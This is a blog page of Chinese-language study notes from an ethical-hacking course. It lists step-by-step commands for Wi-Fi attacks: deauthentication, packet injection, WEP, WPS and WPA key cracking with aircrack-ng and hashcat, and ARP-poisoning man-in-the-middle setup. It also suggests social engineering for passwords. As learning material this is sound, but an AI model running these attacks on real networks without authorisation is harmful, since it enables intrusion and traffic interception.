@@ -1,0 +1,392 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Learn Ethical Hacking From Scratch | Zhi的筆記部落格</title>
+  <meta name="author" content="Zhi">
+  
+  <meta name="description" content="Udemy道德黑客筆記">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Learn Ethical Hacking From Scratch"/>
+  <meta property="og:site_name" content="Zhi的筆記部落格"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Zhi的筆記部落格" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zhi的筆記部落格</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>歷程
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>分類
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>標籤
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>關於Zhi
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Learn Ethical Hacking From Scratch</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> Udemy道德黑客筆記
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="Learn-Ethical-Hacking-From-Scratch"><a href="#Learn-Ethical-Hacking-From-Scratch" class="headerlink" title="Learn Ethical Hacking From Scratch"></a>Learn Ethical Hacking From Scratch</h1><h2 id="Setting-Up-The-Lab"><a href="#Setting-Up-The-Lab" class="headerlink" title="Setting Up The Lab"></a><strong>Setting Up The Lab</strong></h2><h3 id="資源安裝連結"><a href="#資源安裝連結" class="headerlink" title="資源安裝連結"></a><strong>資源安裝連結</strong></h3><h4 id="Kali-linux下載"><a href="#Kali-linux下載" class="headerlink" title="Kali linux下載"></a><strong>Kali linux下載</strong></h4><blockquote>
+<p>下載連結: <a target="_blank" rel="noopener" href="https://zsecurity.org/download-custom-kali/">https://zsecurity.org/download-custom-kali/</a></p>
+</blockquote>
+<h4 id="Kali-linux更新指令"><a href="#Kali-linux更新指令" class="headerlink" title="Kali linux更新指令"></a><strong>Kali linux更新指令</strong></h4><blockquote>
+<p>資料庫更新指令:apt-get update<br>軟體更新指令:apt-get install &lt;terminator&gt;</p>
+</blockquote>
+<h4 id="Kali-linux指令相關網站"><a href="#Kali-linux指令相關網站" class="headerlink" title="Kali linux指令相關網站"></a><strong>Kali linux指令相關網站</strong></h4><blockquote>
+<p>常用指令集: <a target="_blank" rel="noopener" href="https://www.mediacollege.com/linux/command/linux-command.html">Linux Commands</a><br>用法解說網站: <a target="_blank" rel="noopener" href="https://explainshell.com/">explainshell.com</a></p>
+</blockquote>
+<h2 id="Network-Basices"><a href="#Network-Basices" class="headerlink" title="Network Basices"></a><strong>Network Basices</strong></h2><h3 id="課程所需網卡推薦"><a href="#課程所需網卡推薦" class="headerlink" title="課程所需網卡推薦"></a><strong>課程所需網卡推薦</strong></h3><h4 id="Kali-linux監聽功能網卡推薦"><a href="#Kali-linux監聽功能網卡推薦" class="headerlink" title="Kali linux監聽功能網卡推薦"></a><strong>Kali linux監聽功能網卡推薦</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/0lqRZ3MWPXY?si=Uo1r7Y8PKW3DjRuq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
+<h4 id="Kali-linux監聽功能網卡商店"><a href="#Kali-linux監聽功能網卡商店" class="headerlink" title="Kali linux監聽功能網卡商店"></a><strong>Kali linux監聽功能網卡商店</strong></h4><blockquote>
+<p>網址: <a target="_blank" rel="noopener" href="https://zsecurity.org/shop/">zsecurity shop</a></p>
+</blockquote>
+<h3 id="網卡設定"><a href="#網卡設定" class="headerlink" title="網卡設定"></a><strong>網卡設定</strong></h3><h4 id="查詢網路介面資訊"><a href="#查詢網路介面資訊" class="headerlink" title="查詢網路介面資訊"></a><strong>查詢網路介面資訊</strong></h4><blockquote>
+<p>指令: ifconfig<br>只查看無線接口指令: iwconfig</p>
+</blockquote>
+<h4 id="查詢無線網路網卡"><a href="#查詢無線網路網卡" class="headerlink" title="查詢無線網路網卡"></a><strong>查詢無線網路網卡</strong></h4><blockquote>
+<p>指令: iwconfig</p>
+</blockquote>
+<h4 id="更改MAC網卡位置"><a href="#更改MAC網卡位置" class="headerlink" title="更改MAC網卡位置"></a><strong>更改MAC網卡位置</strong></h4><blockquote>
+<p>step 1: ifconfig wlan0 down<br>step 2: ifconfig wlan0 hw ether 00:11:22:33:44:55<br>step 3: ifconfig wlan0 up</p>
+</blockquote>
+<h4 id="啟用網卡監聽模式"><a href="#啟用網卡監聽模式" class="headerlink" title="啟用網卡監聽模式"></a><strong>啟用網卡監聽模式</strong></h4><blockquote>
+<p>step 1: ifconfig wlan0 down<br>step 2: airmon-ng check kill (停止網路管理器運行程序)<br>step 3: iwconfig wlan0 mode monitor<br>step 4: ifconfig wlan0 up</p>
+</blockquote>
+<h4 id="啟用網卡監聽模式-其他方法"><a href="#啟用網卡監聽模式-其他方法" class="headerlink" title="啟用網卡監聽模式(其他方法)"></a><strong>啟用網卡監聽模式(其他方法)</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/wiIoR_0epvs?si=Fm4LygIfdqSBlcvB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
+<p>:::success<br>note:</p>
+<ol>
+<li>網卡的MAC位置設定建議開頭為00</li>
+<li>手動更卡網卡位置在重新開機時將還原<br>:::</li>
+</ol>
+<h2 id="Pre-Connection-Attacks"><a href="#Pre-Connection-Attacks" class="headerlink" title="Pre-Connection Attacks"></a><strong>Pre-Connection Attacks</strong></h2><h3 id="監聽取得封包"><a href="#監聽取得封包" class="headerlink" title="監聽取得封包"></a><strong>監聽取得封包</strong></h3><h4 id="選擇尋找目標"><a href="#選擇尋找目標" class="headerlink" title="選擇尋找目標"></a><strong>選擇尋找目標</strong></h4><blockquote>
+<p>指令(不包含5G頻段網路): airodump-ng &lt;wlan0&gt;<br>指令(5G頻段網路，a頻段) : airodump-ng –band a &lt;wlan0&gt;<br>指令(混和頻段網路) : airodump-ng –band abg &lt;wlan0&gt;<br>選擇目標記錄下他的bssid、channel</p>
+</blockquote>
+<h4 id="對目標實施監聽並取得封包"><a href="#對目標實施監聽並取得封包" class="headerlink" title="對目標實施監聽並取得封包"></a><strong>對目標實施監聽並取得封包</strong></h4><blockquote>
+<p>指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0</p>
+</blockquote>
+<h3 id="WEP破解"><a href="#WEP破解" class="headerlink" title="WEP破解"></a><strong>WEP破解</strong></h3><blockquote>
+<p>step 1: 累積封包到一定數目<br>step 2: aircrack-ng 檔案名.cap<br><img src="https://hackmd.io/_uploads/S1trLcJ5a.jpg" alt="1"><br>密碼:將(1)的冒號刪除輸入或輸入(2)</p>
+</blockquote>
+<h3 id="快速累積封包"><a href="#快速累積封包" class="headerlink" title="快速累積封包"></a><strong>快速累積封包</strong></h3><h4 id="aireplay-ng去認證攻擊"><a href="#aireplay-ng去認證攻擊" class="headerlink" title="aireplay-ng去認證攻擊"></a><strong>aireplay-ng去認證攻擊</strong></h4><blockquote>
+<p>指令: aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0</p>
+</blockquote>
+<h4 id="aireplay-ng假認證攻擊"><a href="#aireplay-ng假認證攻擊" class="headerlink" title="aireplay-ng假認證攻擊"></a><strong>aireplay-ng假認證攻擊</strong></h4><blockquote>
+<p>指令: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0</p>
+</blockquote>
+<h4 id="Packet-Injection-ARP-Request-Reply-Attack"><a href="#Packet-Injection-ARP-Request-Reply-Attack" class="headerlink" title="Packet Injection - ARP Request Reply Attack"></a><strong>Packet Injection - ARP Request Reply Attack</strong></h4><blockquote>
+<p>說明 : 迫使連結接入點生成具有新的IV的封包<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –arpreplay -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br><img src="https://hackmd.io/_uploads/ByBg69y5a.jpg" alt="1"></p>
+</blockquote>
+<h4 id="Packet-Injection-Korek-Chopchop-Attack"><a href="#Packet-Injection-Korek-Chopchop-Attack" class="headerlink" title="Packet Injection - Korek Chopchop Attack"></a><strong>Packet Injection - Korek Chopchop Attack</strong></h4><blockquote>
+<p>說明 : 嘗試確定密鑰流<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –chopchop -b 目標網路MAC -h 自己網卡的MAC<br>等待終端C跳出是否解密(y)<br><img src="https://hackmd.io/_uploads/HkIoC5kqT.jpg" alt="1"><br>解密完後，終端C:<br><img src="https://hackmd.io/_uploads/Skmc1iyca.jpg" alt="1"><br>:::success<br>y後面接的是解密後的檔案名<br>:::<br>終端C注入:<br><img src="https://hackmd.io/_uploads/B1N7lsyqp.jpg" alt="1"></p>
+</blockquote>
+<h4 id="Packet-Injection-Fragmentation-Attack"><a href="#Packet-Injection-Fragmentation-Attack" class="headerlink" title="Packet Injection - Fragmentation Attack"></a><strong>Packet Injection - Fragmentation Attack</strong></h4><blockquote>
+<p>說明 : 偽造封包注入</p>
+<blockquote>
+<p>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –fragment -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C:等待詢問是否用此數據包(y)，試圖確定PRG，有可能失敗<br>終端C:取得密鑰流檔案.xor<br>終端C:使用以下兩命令製作及注入封包:<br><img src="https://hackmd.io/_uploads/ByBvfskc6.jpg" alt="1"></p>
+</blockquote>
+</blockquote>
+<h3 id="WPA破解-啟用WPS且PBC沒啟用"><a href="#WPA破解-啟用WPS且PBC沒啟用" class="headerlink" title="WPA破解(啟用WPS且PBC沒啟用)"></a><strong>WPA破解(啟用WPS且PBC沒啟用)</strong></h3><h4 id="查看是否啟用WPS"><a href="#查看是否啟用WPS" class="headerlink" title="查看是否啟用WPS"></a><strong>查看是否啟用WPS</strong></h4><blockquote>
+<p>指令 : wash –interface wlan0</p>
+</blockquote>
+<h4 id="破解WPS"><a href="#破解WPS" class="headerlink" title="破解WPS"></a><strong>破解WPS</strong></h4><blockquote>
+<p>執行以下兩個終端機<br><img src="https://hackmd.io/_uploads/HkpOVs15p.jpg" alt="a"></p>
+</blockquote>
+<h3 id="WPA破解-禁用WPS或PBC啟用"><a href="#WPA破解-禁用WPS或PBC啟用" class="headerlink" title="WPA破解(禁用WPS或PBC啟用)"></a><strong>WPA破解(禁用WPS或PBC啟用)</strong></h3><h4 id="取得握手包"><a href="#取得握手包" class="headerlink" title="取得握手包"></a><strong>取得握手包</strong></h4><blockquote>
+<p>說明:監聽直到出現以下圖片右上文字<br>終端A指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B指令(加速): aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0<br><img src="https://hackmd.io/_uploads/H1x48jk9T.jpg" alt="1"></p>
+</blockquote>
+<h4 id="創建字典"><a href="#創建字典" class="headerlink" title="創建字典"></a><strong>創建字典</strong></h4><blockquote>
+<p>說明:使用Crunch創建密碼字典<br><img src="https://hackmd.io/_uploads/ByhAU9lq6.jpg" alt="1"><br>單字列表參考網址:<br><a href="ftp://ftp.openwall.com/pub/wordlists/">ftp://ftp.openwall.com/pub/wordlists/</a><br><a target="_blank" rel="noopener" href="http://www.openwall.com/mirrors/">openwall.com&#x2F;mirrors&#x2F;</a><br><a target="_blank" rel="noopener" href="http://gdataonline.com/downloads/GDict/">gdataonline.com&#x2F;downloads&#x2F;GDict&#x2F;</a><br><a target="_blank" rel="noopener" href="http://www.outpost9.com/files/WordLists.html">outpost9.com&#x2F;files&#x2F;WordLists.html</a><br><a target="_blank" rel="noopener" href="http://www.vulnerabilityassessment.co.uk/passwords.htm">vulnerabilityassessment.co.uk&#x2F;passwords.htm</a><br><a target="_blank" rel="noopener" href="http://packetstormsecurity.org/Crackers/wordlists/">packetstormsecurity.org&#x2F;Crackers&#x2F;wordlists&#x2F;</a><br><a target="_blank" rel="noopener" href="http://www.ai.uga.edu/ftplib/natural-language/moby/">ai.uga.edu&#x2F;ftplib&#x2F;natural-language&#x2F;moby&#x2F;</a><br><a target="_blank" rel="noopener" href="http://www.cotse.com/tools/wordlists1.htm">cotse.com&#x2F;tools&#x2F;wordlists1.htm</a><br><a target="_blank" rel="noopener" href="http://www.cotse.com/tools/wordlists2.htm">cotse.com&#x2F;tools&#x2F;wordlists2.htm</a><br><a target="_blank" rel="noopener" href="http://wordlist.sourceforge.net/">wordlist.sourceforge.net&#x2F;</a></p>
+</blockquote>
+<h4 id="密碼爆破"><a href="#密碼爆破" class="headerlink" title="密碼爆破"></a><strong>密碼爆破</strong></h4><blockquote>
+<p>指令aircrack-ng 檔案名.cap -w 字典路徑<br>:::success<br>目前止WPA2破解唯一方式，建議以社交工程騙取密碼<br>:::</p>
+</blockquote>
+<h3 id="加速WPA破解"><a href="#加速WPA破解" class="headerlink" title="加速WPA破解"></a><strong>加速WPA破解</strong></h3><h4 id="Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間"><a href="#Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間" class="headerlink" title="Cracking the Key Quicker using a Rainbow Table(以空間換時間)"></a><strong>Cracking the Key Quicker using a Rainbow Table(以空間換時間)</strong></h4><blockquote>
+<p>說明 : 先將密碼字典中的密碼加密，以便之後比對<br>創建資料庫 : airolib-ng test-db –import passwd 密碼字典.txt<br>創建破解網路明文件: echo “TOTOLINK_A800R(網路名)” &gt;test-essid<br><img src="https://hackmd.io/_uploads/HkhBEsxqa.jpg" alt="1"><br>將essid導入 :　airolib-ng test-db –import essid test-essid（文件名）<br>將每個密碼列表與ｅｓｓｉｄ結合計算每個密碼的ＰＭＫ：airolib-ng test-db　–batch　<br>輸入以下指令用資料庫破解:<br><img src="https://hackmd.io/_uploads/SJamTjg96.jpg" alt="1"></p>
+</blockquote>
+<h4 id="Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解"><a href="#Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解" class="headerlink" title="Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)"></a><strong>Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)</strong></h4><blockquote>
+<p>下載驅動GUI(windown)<br><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">hashcat.net&#x2F;hashcat&#x2F;</a><br><img src="https://hackmd.io/_uploads/SyYgJhgcp.jpg" alt="1"><br>下載hashcat二進制文件<br><img src="https://hackmd.io/_uploads/SJk3yhe5a.jpg" alt="1"><br>將cap握手包轉成hashcat支援的格式:<br><a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">hashcat.net&#x2F;cap2hashcat&#x2F;</a><br><img src="https://hackmd.io/_uploads/SJ__x3gqa.jpg" alt="1"><br>把下圖兩文件丟到hashcat資料夾裡<br><img src="https://hackmd.io/_uploads/BJY0l2xqT.jpg" alt="1"><br>cmd到hashcat目錄執行<br>執行hashcat64.exe -I 查看可用GPU<br><img src="https://hackmd.io/_uploads/SJO0ZhgcT.jpg" alt="1"><br>執行以下命令:<br><img src="https://hackmd.io/_uploads/S1TNz2xqp.jpg" alt="1"><br>:::success<br>note:</p>
+</blockquote>
+<ol>
+<li>-m 數字 : 代表加密類型</li>
+<li>-d 數字 : 使用哪個GUI<br>:::</li>
+</ol>
+<h2 id="連接後攻擊"><a href="#連接後攻擊" class="headerlink" title="連接後攻擊"></a><strong>連接後攻擊</strong></h2><h3 id="Post-Connection-Attacks"><a href="#Post-Connection-Attacks" class="headerlink" title="Post Connection Attacks"></a><strong>Post Connection Attacks</strong></h3><h4 id="Installing-Windows-As-a-Virtual-machine"><a href="#Installing-Windows-As-a-Virtual-machine" class="headerlink" title="Installing Windows As a Virtual machine"></a><strong>Installing Windows As a Virtual machine</strong></h4><blockquote>
+<p>網址:<a target="_blank" rel="noopener" href="https://ln5.sync.com/dl/69a8cb2b0/k2xyv9ke-qevy6hgz-tavwxu3c-78858267/view/default/11829848200004">windows模擬機下載</a></p>
+</blockquote>
+<h3 id="Post-Connection-Attacks-資料蒐集"><a href="#Post-Connection-Attacks-資料蒐集" class="headerlink" title="Post Connection Attacks-資料蒐集"></a><strong>Post Connection Attacks-資料蒐集</strong></h3><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a><strong>netdiscover</strong></h4><blockquote>
+<p>指令 : netdiscover -r 192.168.17.1&#x2F;24<br>:::success<br>note : </p>
+</blockquote>
+<ol>
+<li>只能找尋目前所在子網域的主機</li>
+<li>如果用無線網路試配器，要在虛擬機取消網路連線<br><img src="https://hackmd.io/_uploads/rJ7Yaf-5a.jpg" alt="1"><br>:::</li>
+</ol>
+<h4 id="GUI-Nmap"><a href="#GUI-Nmap" class="headerlink" title="GUI Nmap"></a><strong>GUI Nmap</strong></h4><blockquote>
+<p>指令 : zenmap</p>
+</blockquote>
+<h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h3><h4 id="ARP-Poisoning-Using-arpspoof"><a href="#ARP-Poisoning-Using-arpspoof" class="headerlink" title="ARP Poisoning Using arpspoof"></a><strong>ARP Poisoning Using arpspoof</strong></h4><blockquote>
+<p>查看window跟kali的網路介面 : arp -a<br>指令 : arpspoof -i eth0 -t  目標機器MAC 受欺騙機器MAC<br><img src="https://hackmd.io/_uploads/BJ3wyE-c6.jpg" alt="1"></p>
+</blockquote>
+<p>:::success<br>note:</p>
+<ol>
+<li>終端A:欺騙192.168.17.131(目標)，我是192.168.17.2(路由器)</li>
+<li>終端B:欺騙192.168.17.2(路由器)，我是192.168.17.131(目標)</li>
+<li>終端C:查詢kali的arp表格<br>:::<br>指令 : echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>:::success<br>note:<br>这条命令的含义是将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件中。</li>
+</ol>
+<p>在 Linux 系统中，&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 是一个特殊的文件，用于控制 IP 转发功能。IP 转发是指将收到的 IP 数据包从一个网络接口转发到另一个网络接口的功能。</p>
+<p>当将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件时，表示启用了 IP 转发功能。这意味着 Linux 系统将允许接收到的 IP 数据包在不同的网络接口之间进行转发，而不仅仅是将数据包发送到本地系统。</p>
+<p>通常情况下，启用 IP 转发功能是在路由器或者具有网络转发功能的计算机上使用，以便它们可以转发数据包来连接不同的网络。<br>只是暫時，重開機後失效<br>linux一般禁止ip轉接<br>:::</p>
+
+	  <div class="article-footer-copyright">
+    Zhi筆記 2024/01/28
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-25 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Udemy/">Udemy<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Udemy/">Udemy<span>1</span></a></li> <li><a href="/tags/道德黑客/">道德黑客<span>1</span></a></li> <li><a href="/tags/自學/">自學<span>1</span></a></li> <li><a href="/tags/筆記/">筆記<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Learn-Ethical-Hacking-From-Scratch"><span class="toc-article-text">Learn Ethical Hacking From Scratch</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Setting-Up-The-Lab"><span class="toc-article-text">Setting Up The Lab</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%B3%87%E6%BA%90%E5%AE%89%E8%A3%9D%E9%80%A3%E7%B5%90"><span class="toc-article-text">資源安裝連結</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kali-linux%E4%B8%8B%E8%BC%89"><span class="toc-article-text">Kali linux下載</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kali-linux%E6%9B%B4%E6%96%B0%E6%8C%87%E4%BB%A4"><span class="toc-article-text">Kali linux更新指令</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kali-linux%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E7%B6%B2%E7%AB%99"><span class="toc-article-text">Kali linux指令相關網站</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Network-Basices"><span class="toc-article-text">Network Basices</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AA%B2%E7%A8%8B%E6%89%80%E9%9C%80%E7%B6%B2%E5%8D%A1%E6%8E%A8%E8%96%A6"><span class="toc-article-text">課程所需網卡推薦</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kali-linux%E7%9B%A3%E8%81%BD%E5%8A%9F%E8%83%BD%E7%B6%B2%E5%8D%A1%E6%8E%A8%E8%96%A6"><span class="toc-article-text">Kali linux監聽功能網卡推薦</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kali-linux%E7%9B%A3%E8%81%BD%E5%8A%9F%E8%83%BD%E7%B6%B2%E5%8D%A1%E5%95%86%E5%BA%97"><span class="toc-article-text">Kali linux監聽功能網卡商店</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B6%B2%E5%8D%A1%E8%A8%AD%E5%AE%9A"><span class="toc-article-text">網卡設定</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E8%A9%A2%E7%B6%B2%E8%B7%AF%E4%BB%8B%E9%9D%A2%E8%B3%87%E8%A8%8A"><span class="toc-article-text">查詢網路介面資訊</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E8%A9%A2%E7%84%A1%E7%B7%9A%E7%B6%B2%E8%B7%AF%E7%B6%B2%E5%8D%A1"><span class="toc-article-text">查詢無線網路網卡</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9B%B4%E6%94%B9MAC%E7%B6%B2%E5%8D%A1%E4%BD%8D%E7%BD%AE"><span class="toc-article-text">更改MAC網卡位置</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%95%9F%E7%94%A8%E7%B6%B2%E5%8D%A1%E7%9B%A3%E8%81%BD%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">啟用網卡監聽模式</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%95%9F%E7%94%A8%E7%B6%B2%E5%8D%A1%E7%9B%A3%E8%81%BD%E6%A8%A1%E5%BC%8F-%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="toc-article-text">啟用網卡監聽模式(其他方法)</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Pre-Connection-Attacks"><span class="toc-article-text">Pre-Connection Attacks</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%A3%E8%81%BD%E5%8F%96%E5%BE%97%E5%B0%81%E5%8C%85"><span class="toc-article-text">監聽取得封包</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%81%B8%E6%93%87%E5%B0%8B%E6%89%BE%E7%9B%AE%E6%A8%99"><span class="toc-article-text">選擇尋找目標</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%8D%E7%9B%AE%E6%A8%99%E5%AF%A6%E6%96%BD%E7%9B%A3%E8%81%BD%E4%B8%A6%E5%8F%96%E5%BE%97%E5%B0%81%E5%8C%85"><span class="toc-article-text">對目標實施監聽並取得封包</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#WEP%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">WEP破解</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BF%AB%E9%80%9F%E7%B4%AF%E7%A9%8D%E5%B0%81%E5%8C%85"><span class="toc-article-text">快速累積封包</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#aireplay-ng%E5%8E%BB%E8%AA%8D%E8%AD%89%E6%94%BB%E6%93%8A"><span class="toc-article-text">aireplay-ng去認證攻擊</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#aireplay-ng%E5%81%87%E8%AA%8D%E8%AD%89%E6%94%BB%E6%93%8A"><span class="toc-article-text">aireplay-ng假認證攻擊</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Packet-Injection-ARP-Request-Reply-Attack"><span class="toc-article-text">Packet Injection - ARP Request Reply Attack</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Packet-Injection-Korek-Chopchop-Attack"><span class="toc-article-text">Packet Injection - Korek Chopchop Attack</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Packet-Injection-Fragmentation-Attack"><span class="toc-article-text">Packet Injection - Fragmentation Attack</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" 